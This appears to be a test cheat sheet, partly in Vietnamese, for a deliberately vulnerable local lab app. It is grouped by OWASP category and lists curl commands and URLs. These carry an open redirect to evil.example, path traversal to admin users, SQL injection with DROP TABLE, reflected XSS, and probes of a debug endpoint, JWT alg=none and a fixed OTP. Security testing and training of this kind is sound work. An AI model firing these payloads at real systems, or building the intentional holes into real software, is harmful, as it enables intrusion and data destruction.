A01 Broken Access Control

SC-01 IDOR · SC-08 BFLA · SC-33 path traversal BFF · SC-71 open redirect.

# Open redirect sau login (SC-71)
http://localhost:3000/dang-nhap?next=https://evil.example/phish

# BFF path traversal (SC-33) — admin session cookie
curl -s "http://localhost:3100/api/bff/catalog/../identity/admin/users" -b "nexatech_admin_session=..."

A02 Security Misconfiguration

SC-28 insecure cookies · SC-30 CORS * · SC-67 debug · SC-74 thiếu X-Frame-Options/CSP.

curl -sI http://localhost:3000/ | findstr /i "x-frame content-security"
curl -s http://localhost:3001/health/debug

Kỳ vọng: thiếu frame protection headers trên nhiều response; debug dump có configHint.

A03 Supply Chain

curl -s "http://localhost:3001/lab/supply-chain?digest=0000"

A04 Cryptographic Failures

SC-66 weak secret compare (shipping webhook) · SC-24 OTP cố định · SC-70 JWT alg=none flag.

curl -s http://localhost:3001/lab/jwt-alg-none

A05 Injection

SC-63 SQL ORDER BY · SC-72 reflected XSS trên tìm kiếm.

# SQLi via sort (catalog)
curl -s "http://localhost:3003/api/v1/products?sort=id;%20DROP%20TABLE%20products--"

# Reflected XSS (browser)
http://localhost:3000/tim-kiem?q=%3Cimg%20src=x%20onerror=alert(1)%3E

Trang search echo q bằng dangerouslySetInnerHTML (intentional).

SC-12 price manipulation · SC-20 amount mismatch · SC-58 unlimited checkout.

A07 Authentication Failures

SC-21 no rate limit · SC-24 OTP 000000 · SC-75 user enumeration details trên auth failure paths khi wired.

  -H "content-type: application/json" \
